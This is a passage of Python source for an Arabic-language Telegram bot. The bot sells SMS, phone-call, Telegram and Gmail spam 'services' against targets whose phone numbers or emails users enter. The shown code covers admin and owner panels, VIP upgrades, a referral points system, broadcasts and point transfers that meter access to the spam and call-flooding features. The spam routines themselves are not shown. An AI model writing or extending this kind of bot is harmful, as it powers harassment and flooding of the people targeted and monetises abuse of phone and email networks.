    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ هذا الأمر للأدمن فقط!")
        return
    try:
        target = int(context.args[0])
        days = int(context.args[1])
        expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('UPDATE users SET is_vip = 1, vip_expiry = ? WHERE user_id = ?', (expiry, target))
            conn.commit()
            conn.close()
        await update.message.reply_text(f"✅ تم ترقية {target} إلى VIP لمدة {days} يوم")
        try:
            await context.bot.send_message(target, f"👑 تم ترقيتك إلى VIP!\n\n✅ محاولات غير محدودة\n✅ جميع الخدمات متاحة\n\nلمدة {days} يوم")
        except:
            pass
    except:
        await update.message.reply_text("❌ استخدم: `/add_vip <ايدي> <أيام>`\n\n📝 مثال: `/add_vip 123456789 7`")

async def set_limit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ هذا الأمر للمالك فقط!")
        return
    try:
        service = context.args[0]
        limit = int(context.args[1])
        if service not in ["call", "spam_asia", "spam_ether", "spam_telegram", "spam_email"]:
            await update.message.reply_text("❌ خدمة غير صحيحة!\nالخدمات المتاحة: call, spam_asia, spam_ether, spam_telegram, spam_email")
            return
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute(f'UPDATE settings SET value = ? WHERE key = "limit_{service}"', (str(limit),))
            conn.commit()
            conn.close()
            DEFAULT_LIMITS[service] = limit
        await update.message.reply_text(f"✅ تم تعديل الحد المجاني لخدمة {service} إلى {limit} محاولة يومياً")
    except:
        await update.message.reply_text("❌ استخدم: `/setlimit <الخدمة> <العدد>`\n\n📝 مثال: `/setlimit call 10`")

async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = get_referral_code(user_id)
    bot_username = context.bot.username
    link = f"https://t.me/{bot_username}?start=ref_{code}"
    points = get_user_points(user_id)
    referrals = get_referral_count(user_id)
    clicks, registered = get_referral_stats(user_id)
    
    await update.message.reply_text(
        f"✦ • ───────────────── • ✦\n"
        f"🔗 *رابط الدعوة الخاص بك* 🔗\n"
        f"✦ • ───────────────── • ✦\n\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃ 💎 نقاطك: {points}\n"
        f"┃ 👥 عدد المحالين: {referrals}\n"
        f"┃ 🔗 نقرات رابطك: {clicks}\n"
        f"┃ 📝 مسجلين عبرك: {registered}\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"🔗 رابطك:\n`{link}`\n\n"
        f"✨ كل شخص يسجل عبر هذا الرابط يمنحك *1 نقطة*",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 مشاركة الرابط", url=f"https://t.me/share/url?url={link}&text=🚀 انضم لهذا البوت الرائع!")]])
    )

# ========== الإذاعة ==========
async def broadcast_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['broadcast_type'] = update.callback_query.data
    context.user_data['wait_broadcast'] = True
    context.user_data['broadcast_step'] = 'waiting_message'
    
    if update.callback_query.data == 'broadcast_private':
        await update.callback_query.edit_message_text(
            f"🔒 *إذاعة خاصة*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 1️⃣ أرسل ايدي المستخدم\n"
            f"┃ 2️⃣ ثم أرسل الرسالة\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📝 *أرسل ايدي المستخدم:*\n"
            f"مثال: 123456789",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 إلغاء", callback_data="admin_panel")]]),
            parse_mode='Markdown'
        )
    else:
        await update.callback_query.edit_message_text(
            f"📢 *إذاعة عامة*\n\n"
            f"يمكنك إرسال نص أو صورة أو فيديو\n\n"
            f"⚠️ سيتم إرسالها لجميع المستخدمين",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 إلغاء", callback_data="admin_panel")]]),
            parse_mode='Markdown'
        )

async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('wait_broadcast'):
        return
    
    btype = context.user_data['broadcast_type']
    step = context.user_data.get('broadcast_step', 'waiting_message')
    
    if btype == 'broadcast_private' and step == 'waiting_user':
        try:
            target_id = int(update.message.text.strip())
            context.user_data['broadcast_target'] = target_id
            context.user_data['broadcast_step'] = 'waiting_message'
            await update.message.reply_text(f"✅ تم تحديد المستخدم: {target_id}\n\n📝 أرسل الآن الرسالة:")
        except:
            await update.message.reply_text("❌ أرسل ايدي رقمي صحيح!")
        return
    
    if btype == 'broadcast_private':
        target_id = context.user_data.get('broadcast_target')
        if not target_id:
            await update.message.reply_text("❌ خطأ في تحديد المستخدم")
            context.user_data['wait_broadcast'] = False
            return
        
        try:
            if update.message.text:
                await context.bot.send_message(target_id, update.message.text)
            elif update.message.photo:
                await context.bot.send_photo(target_id, update.message.photo[-1].file_id, caption=update.message.caption)
            elif update.message.video:
                await context.bot.send_video(target_id, update.message.video.file_id, caption=update.message.caption)
            else:
                await context.bot.send_message(target_id, "📢 إشعار من الإدارة")
            await update.message.reply_text(f"✅ تم إرسال الرسالة إلى المستخدم {target_id}")
        except Exception as e:
            await update.message.reply_text(f"❌ فشل الإرسال: {str(e)[:100]}")
        
        context.user_data['wait_broadcast'] = False
        context.user_data['broadcast_step'] = None
        return
    
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        if btype == 'broadcast_all':
            c.execute('SELECT user_id FROM users')
        else:
            c.execute('SELECT user_id FROM users WHERE is_vip = 1')
        users = c.fetchall()
        conn.close()
    
    msg = await update.message.reply_text(f"📨 جاري الإرسال إلى {len(users)} مستخدم...")
    success = 0
    fail = 0
    
    for user in users:
        try:
            if update.message.text:
                await context.bot.send_message(user[0], update.message.text)
            elif update.message.photo:
                await context.bot.send_photo(user[0], update.message.photo[-1].file_id, caption=update.message.caption)
            elif update.message.video:
                await context.bot.send_video(user[0], update.message.video.file_id, caption=update.message.caption)
            else:
                await context.bot.send_message(user[0], "📢 إشعار من الإدارة")
            success += 1
            await asyncio.sleep(0.03)
        except:
            fail += 1
    
    await msg.edit_text(f"✅ تم الإرسال بنجاح!\n\n📨 تم الإرسال إلى: {success} مستخدم\n❌ فشل الإرسال إلى: {fail} مستخدم")
    context.user_data['wait_broadcast'] = False

# ========== معالج الأزرار ==========
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        data = query.data
        
        if data == "services_menu":
            await services_menu(update, context)
        elif data == "show_balance":
            await show_balance(update, context)
        elif data == "earn_points":
            await earn_points(update, context)
        elif data == "my_info":
            await my_info(update, context)
        elif data == "transfer_menu":
            await transfer_menu(update, context)
        elif data == "transfer_points":
            await transfer_points(update, context)
        elif data == "transfer_service_menu":
            await transfer_service_menu(update, context)
        elif data == "back_main":
            await back_main(update, context)
        elif data == "call_menu":
            await call_menu_func(update, context)
        elif data == "spam_asia_menu":
            await spam_menu_generic(update, context, 'asia', 'سبام آسيا', "🌏")
        elif data == "spam_ether_menu":
            await spam_menu_generic(update, context, 'ether', 'سبام اثير', "🔥")
        elif data == "spam_telegram_menu":
            await spam_menu_generic(update, context, 'telegram', 'سبام تيليجرام', "📱")
        elif data == "spam_email_menu":
            await spam_menu_generic(update, context, 'email', 'سبام جيميل', "✉️")
        elif data == "redeem_menu":
            await redeem_menu(update, context)
        elif data.startswith("redeem_"):
            await redeem_service(update, context)
        elif data == "vip_menu":
            await vip_menu_func(update, context)
        elif data == "admin_panel":
            await admin_panel_func(update, context)
        elif data == "owner_panel":
            await owner_panel_func(update, context)
        elif data == "admin_stats":
            await admin_stats_func(update, context)
        elif data == "add_points_admin":
            await add_points_admin_func(update, context)
        elif data == "add_vip_admin":
            await add_vip_admin_func(update, context)
        elif data == "toggle_call":
            await toggle_call(update, context)
        elif data == "toggle_asia":
            await toggle_asia(update, context)
        elif data == "toggle_ether":
            await toggle_ether(update, context)
        elif data == "toggle_telegram":
            await toggle_telegram(update, context)
        elif data == "toggle_email":
            await toggle_email(update, context)
        elif data == "toggle_referral":
            await toggle_referral(update, context)
        elif data == "edit_limits":
            await edit_limits(update, context)
        elif data == "owner_add_admin":
            context.user_data['wait_admin'] = True
            await query.edit_message_text(
                f"✦ • ───────────────── • ✦\n"
                f"👑 *رفع مستخدم إلى أدمن* 👑\n"
                f"✦ • ───────────────── • ✦\n\n"
                f"📝 *أرسل ايدي المستخدم الآن*\n"
                f"مثال: 123456789\n\n"
                f"⚠️ سيتم رفع المستخدم إلى أدمن فوراً",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="owner_panel")]]),
                parse_mode='Markdown'
            )
        elif data == "owner_remove_admin":
            context.user_data['wait_remove_admin'] = True
            await query.edit_message_text(
                f"✦ • ───────────────── • ✦\n"
                f"📉 *تنزيل مستخدم من الأدمن* 📉\n"
                f"✦ • ───────────────── • ✦\n\n"
                f"📝 *أرسل ايدي المستخدم الآن*\n"
                f"مثال: 123456789\n\n"
                f"⚠️ سيتم تنزيل المستخدم من الأدمن فوراً",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="owner_panel")]]),
                parse_mode='Markdown'
            )
        elif data == "owner_add_channel":
            context.user_data['wait_channel'] = True
            await query.edit_message_text(
                f"✦ • ───────────────── • ✦\n"
                f"🔗 *إضافة قناة اشتراك إجباري* 🔗\n"
                f"✦ • ───────────────── • ✦\n\n"
                f"📝 *أرسل معرف القناة الآن*\n"
                f"مثال: @channel\n\n"
                f"⚠️ *ملاحظات هامة:*\n"
                f"• يجب رفع البوت أدمن في القناة أولاً\n"
                f"• سأتأكد من صلاحياتي قبل الإضافة\n"
                f"• إذا نجحت سأخبرك، وإلا سأخبرك بالخطأ",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="owner_panel")]]),
                parse_mode='Markdown'
            )
        elif data == "owner_remove_channel":
            with db_lock:
                conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                c = conn.cursor()
                c.execute('SELECT channel_username FROM force_channels')
                channels = c.fetchall()
                conn.close()
            if not channels:
                await query.edit_message_text("❌ لا توجد قنوات", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="owner_panel")]]))
                return
            kb = [[InlineKeyboardButton(f"❌ @{ch[0]}", callback_data=f"del_{ch[0]}")] for ch in channels]
            kb.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_panel")])
            await query.edit_message_text("اختر القناة للحذف:", reply_markup=InlineKeyboardMarkup(kb))
        elif data.startswith("del_"):
            channel = data.replace("del_", "")
            with db_lock:
                conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                c = conn.cursor()
                c.execute('DELETE FROM force_channels WHERE channel_username = ?', (channel,))
                conn.commit()
                conn.close()
            await query.answer(f"✅ تم حذف @{channel}")
            await owner_panel_func(update, context)
        elif data == "check_sub":
            ok, ch = await check_channel(query.from_user.id, context)
            if ok:
                await show_main_menu(query.message, query.from_user.id, context)
            else:
                keyboard = [[InlineKeyboardButton("📢 اشترك", url=f"https://t.me/{ch}")], [InlineKeyboardButton("✅ تحقق", callback_data="check_sub")]]
                await query.edit_message_text(f"⚠️ اشترك أولاً في @{ch}", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data.startswith("broadcast_"):
            await broadcast_menu(update, context)
        
        elif context.user_data.get('wait_admin'):
            try:
                target = int(data)
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (target,))
                    conn.commit()
                    conn.close()
                await query.edit_message_text(f"✅ تم رفع {target} إلى أدمن", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="owner_panel")]]))
                context.user_data['wait_admin'] = False
            except:
                await query.edit_message_text("❌ خطأ! أرسل ايدي رقمي")
        elif context.user_data.get('wait_remove_admin'):
            try:
                target = int(data)
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('UPDATE users SET is_admin = 0 WHERE user_id = ?', (target,))
                    conn.commit()
                    conn.close()
                await query.edit_message_text(f"✅ تم تنزيل {target} من الأدمن", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="owner_panel")]]))
                context.user_data['wait_remove_admin'] = False
            except:
                await query.edit_message_text("❌ خطأ! أرسل ايدي رقمي")
        elif context.user_data.get('wait_channel'):
            username = data.replace('@', '')
            try:
                chat = await context.bot.get_chat(f"@{username}")
                bot_member = await context.bot.get_chat_member(chat.id, context.bot.id)
                if bot_member.status not in ['administrator', 'creator']:
                    await query.edit_message_text(
                        f"❌ *فشل إضافة القناة!*\n\n"
                        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                        f"┃ السبب: البوت ليس أدمن في @{username}\n"
                        f"┃ الحل: قم برفع البوت أدمن في القناة\n"
                        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="owner_panel")]]),
                        parse_mode='Markdown'
                    )
                    return
                
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('INSERT OR REPLACE INTO force_channels (channel_id, channel_username) VALUES (?, ?)', (str(chat.id), username))
                    conn.commit()
                    conn.close()
                
                await query.edit_message_text(
                    f"✅ *تم إضافة القناة بنجاح!*\n\n"
                    f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃ 📢 القناة: @{username}\n"
                    f"┃ ✅ تم التحقق من صلاحيات البوت\n"
                    f"┃ ⚠️ سيطلب من المستخدمين الاشتراك\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="owner_panel")]]),
                    parse_mode='Markdown'
                )
                context.user_data['wait_channel'] = False
            except Exception as e:
                await query.edit_message_text(
                    f"❌ *فشل إضافة القناة!*\n\n"
                    f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃ السبب: {str(e)[:50]}\n"
                    f"┃ الحل: تأكد من صحة معرف القناة\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="owner_panel")]]),
                    parse_mode='Markdown'
                )
    except Exception as e:
        logger.error(f"Error in callback_handler: {e}")

# ========== معالج الرسائل ==========
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # ===== معالجة رفع الأدمن وإضافة القناة =====
        if context.user_data.get('wait_admin'):
            try:
                target = int(update.message.text.strip())
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (target,))
                    conn.commit()
                    conn.close()
                await update.message.reply_text(f"✅ تم رفع `{target}` إلى أدمن بنجاح!", parse_mode='Markdown')
                context.user_data['wait_admin'] = False
                return
            except:
                await update.message.reply_text("❌ خطأ! الرجاء إرسال ايدي رقمي صحيح")
                return
        
        if context.user_data.get('wait_remove_admin'):
            try:
                target = int(update.message.text.strip())
                if target in OWNER_IDS:
                    await update.message.reply_text("❌ لا يمكن تنزيل المالك من الأدمن!")
                    return
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('UPDATE users SET is_admin = 0 WHERE user_id = ?', (target,))
                    conn.commit()
                    conn.close()
                await update.message.reply_text(f"✅ تم تنزيل `{target}` من الأدمن بنجاح!", parse_mode='Markdown')
                context.user_data['wait_remove_admin'] = False
                return
            except:
                await update.message.reply_text("❌ خطأ! الرجاء إرسال ايدي رقمي صحيح")
                return
        
        if context.user_data.get('wait_channel'):
            username = update.message.text.strip().replace('@', '')
            try:
                chat = await context.bot.get_chat(f"@{username}")
                bot_member = await context.bot.get_chat_member(chat.id, context.bot.id)
                if bot_member.status not in ['administrator', 'creator']:
                    await update.message.reply_text(
                        f"❌ *فشل إضافة القناة!*\n\n"
                        f"السبب: البوت ليس أدمن في قناة @{username}\n"
                        f"الحل: قم برفع البوت أدمن في القناة ثم حاول مرة أخرى",
                        parse_mode='Markdown'
                    )
                    return
                
                with db_lock:
                    conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                    c = conn.cursor()
                    c.execute('INSERT OR REPLACE INTO force_channels (channel_id, channel_username) VALUES (?, ?)', (str(chat.id), username))
                    conn.commit()
                    conn.close()
                
                await update.message.reply_text(
                    f"✅ *تم إضافة القناة بنجاح!*\n\n"
                    f"📢 القناة: @{username}\n"
                    f"✅ تم التحقق من صلاحيات البوت\n"
                    f"⚠️ الآن سيطلب البوت من المستخدمين الاشتراك في هذه القناة",
                    parse_mode='Markdown'
                )
                context.user_data['wait_channel'] = False
                return
            except Exception as e:
                await update.message.reply_text(
                    f"❌ *فشل إضافة القناة!*\n\n"
                    f"السبب: {str(e)[:100]}\n"
                    f"الحل: تأكد من صحة معرف القناة وأن البوت أدمن فيها",
                    parse_mode='Markdown'
                )
                return
        
        # ===== باقي المعالجات =====
        if context.user_data.get('call_step') == 'waiting_phone':
            await get_call_phone(update, context)
        elif context.user_data.get('spam_step') == 'waiting_target':
            await get_spam_target(update, context)
        elif context.user_data.get('spam_step') == 'waiting_count':
            await get_spam_count_execute(update, context)
        elif context.user_data.get('spam_need_message'):
            await get_asia_message(update, context)
        elif context.user_data.get('transfer_step') in ['waiting_id', 'waiting_amount', 'waiting_service_id', 'waiting_service_amount']:
            await handle_transfer(update, context)
        elif context.user_data.get('wait_broadcast'):
            await send_broadcast(update, context)
    except Exception as e:
        logger.error(f"Error in handle_messages: {e}")

# دوال تحويل النقاط المتبقية
async def handle_transfer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        step = context.user_data.get('transfer_step')
        
        if step == 'waiting_id':
            try:
                target_id = int(update.message.text.strip())
                if target_id == update.effective_user.id:
                    await update.message.reply_text("❌ لا يمكنك التحويل لنفسك!")
                    return
                context.user_data['transfer_target'] = target_id
                context.user_data['transfer_step'] = 'waiting_amount'
                await update.message.reply_text(f"🔄 *تحويل نقاط*\n\n👤 المستلم: {target_id}\n📝 *أرسل عدد النقاط:*\n\n⚠️ الحد الأدنى: 1 نقطة", parse_mode='Markdown')
            except:
                await update.message.reply_text("❌ ايدي المستخدم غير صحيح!")
        elif step == 'waiting_amount':
            try:
                amount = int(update.message.text.strip())
                if amount < 1:
                    await update.message.reply_text("❌ الحد الأدنى هو نقطة واحدة")
                    return
                user_id = update.effective_user.id
                points = get_user_points(user_id)
                if points < amount:
                    await update.message.reply_text(f"❌ رصيدك غير كافٍ!\nرصيدك: {points} نقطة\nالمطلوب: {amount} نقطة")
                    return
                target_id = context.user_data['transfer_target']
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ قبول", callback_data=f"accept_{user_id}_{target_id}_{amount}"),
                     InlineKeyboardButton("❌ رفض", callback_data=f"reject_{user_id}_{target_id}_{amount}")]
                ])
                await context.bot.send_message(target_id, f"🔄 *طلب تحويل نقود*\n\n👤 المستخدم {user_id} يريد تحويل {amount} نقطة إليك\n\nهل توافق؟", reply_markup=keyboard, parse_mode='Markdown')
                await update.message.reply_text(f"✅ *تم إرسال طلب التحويل!*\n\n👤 إلى: {target_id}\n💰 المبلغ: {amount} نقطة\n\n⏳ في انتظار قبول المستخدم...", parse_mode='Markdown')
                context.user_data['transfer_step'] = None
            except:
                await update.message.reply_text("❌ عدد النقاط غير صحيح!")
        elif step == 'waiting_service_id':
            try:
                target_id = int(update.message.text.strip())
                if target_id == update.effective_user.id:
                    await update.message.reply_text("❌ لا يمكنك التحويل لنفسك!")
                    return
                context.user_data['transfer_target'] = target_id
                context.user_data['transfer_step'] = 'waiting_service_type'
                keyboard = [
                    [InlineKeyboardButton("📞 اتصال", callback_data="transfer_service_call")],
                    [InlineKeyboardButton("🌏 سبام آسيا", callback_data="transfer_service_asia")],
                    [InlineKeyboardButton("🔥 سبام اثير", callback_data="transfer_service_ether")],
                    [InlineKeyboardButton("📱 سبام تيليجرام", callback_data="transfer_service_telegram")],
                    [InlineKeyboardButton("✉️ سبام جيميل", callback_data="transfer_service_email")],
                    [InlineKeyboardButton("🔙 إلغاء", callback_data="transfer_menu")]
                ]
                await update.message.reply_text(f"💎 *تحويل نقاط لخدمة*\n\n👤 المستلم: {target_id}\n\n📌 *اختر الخدمة:*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            except:
                await update.message.reply_text("❌ ايدي المستخدم غير صحيح!")
        elif step == 'waiting_service_amount':
            try:
                amount = int(update.message.text.strip())
                if amount < 1:
                    await update.message.reply_text("❌ الحد الأدنى هو نقطة واحدة")
                    return
                user_id = update.effective_user.id
                points = get_user_points(user_id)
                if points < amount:
                    await update.message.reply_text(f"❌ رصيدك غير كافٍ!\nرصيدك: {points} نقطة\nالمطلوب: {amount} نقطة")
                    return
                target_id = context.user_data['transfer_target']
                update_user_points(user_id, -amount)
                update_user_points(target_id, amount)
                service = context.user_data.get('transfer_service_type', 'call')
                service_names = {"call": "الاتصال", "asia": "سبام آسيا", "ether": "سبام اثير", "telegram": "سبام تيليجرام", "email": "سبام جيميل"}
                await update.message.reply_text(f"✅ *تم تحويل {amount} نقطة بنجاح!*\n\n👤 إلى المستخدم: {target_id}\n📞 للخدمة: {service_names.get(service, service)}", parse_mode='Markdown')
                try:
                    await context.bot.send_message(target_id, f"🎁 *تم استلام نقاط جديدة!*\n\n👤 من المستخدم: {user_id}\n💰 المبلغ: {amount} نقطة\n📞 للخدمة: {service_names.get(service, service)}")
                except:
                    pass
                context.user_data['transfer_step'] = None
            except:
                await update.message.reply_text("❌ عدد النقاط غير صحيح!")
    except Exception as e:
        logger.error(f"Error in handle_transfer: {e}")

async def transfer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        data = query.data
        
        if data.startswith("transfer_service_"):
            service = data.replace("transfer_service_", "")
            context.user_data['transfer_service_type'] = service
            context.user_data['transfer_step'] = 'waiting_service_amount'
            service_names = {"call": "الاتصال", "asia": "سبام آسيا", "ether": "سبام اثير", "telegram": "سبام تيليجرام", "email": "سبام جيميل"}
            await query.edit_message_text(f"💎 *تحويل نقاط لخدمة {service_names.get(service, service)}*\n\n👤 المستلم: {context.user_data.get('transfer_target')}\n\n📝 *أرسل عدد النقاط التي تريد تحويلها:*\n\n⚠️ الحد الأدنى: 1 نقطة", parse_mode='Markdown')
            return
        
        parts = data.split('_')
        if len(parts) != 4:
            await query.answer("خطأ في البيانات", show_alert=True)
            return
        
        action = parts[0]
        from_user = int(parts[1])
        to_user = int(parts[2])
        amount = int(parts[3])
        
        if to_user != query.from_user.id:
            await query.answer("هذا الطلب ليس لك!", show_alert=True)
            return
        
        if action == "accept":
            from_points = get_user_points(from_user)
            if from_points < amount:
                await query.edit_message_text("❌ المستخدم المرسل لا يملك نقاط كافية!")
                return
            update_user_points(from_user, -amount)
            update_user_points(to_user, amount)
            await query.edit_message_text(f"✅ *تم قبول التحويل بنجاح!*\n\n💰 تم إضافة {amount} نقطة إلى رصيدك\n💎 رصيدك الجديد: {get_user_points(to_user)} نقطة", parse_mode='Markdown')
            try:
                await context.bot.send_message(from_user, f"✅ تم قبول تحويل {amount} نقطة من قبل المستخدم {to_user}")
            except:
                pass
        else:
            await query.edit_message_text(f"❌ *تم رفض طلب التحويل*", parse_mode='Markdown')
            try:
                await context.bot.send_message(from_user, f"❌ تم رفض تحويل {amount} نقطة من قبل المستخدم {to_user}")
            except:
                pass
        await query.answer()
    except Exception as e:
        logger.error(f"Error in transfer_callback: {e}")

# ========== التشغيل ==========
def main():
    reset_daily_limits()
    app = (
    Application.builder()
    .token(TOKEN)
    .build()
)
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("referral", referral_command))
    app.add_handler(CommandHandler("add_points", add_points_command))
    app.add_handler(CommandHandler("add_vip", add_vip_command))
    app.add_handler(CommandHandler("setlimit", set_limit_command))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
    app.add_handler(MessageHandler(filters.PHOTO, handle_messages))
    app.add_handler(MessageHandler(filters.VIDEO, handle_messages))
    
    print("=" * 60)
    print("🌟 بوت الخدمات المتكاملة - شغال 100% 🌟")
    print("✅ جميع الخدمات شغالة")
    print("✅ نظام النقاط مفعل")
    print("✅ الأزرار ملونة وجميلة")
    print("✅ لوحة الأدمن شغالة")
    print("✅ لوحة المالك شغالة")
    print("✅ الإذاعة العامة والخاصة شغالة")
    print("✅ تحويل النقاط شغال")
    print("✅ إحصائيات الروابط شغالة")
    print("✅ إضافة القنوات مع تأكيد الرفع")
    print(f"⭐ VIP: @{PAYMENT_USERNAME}")
    print("=" * 60)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()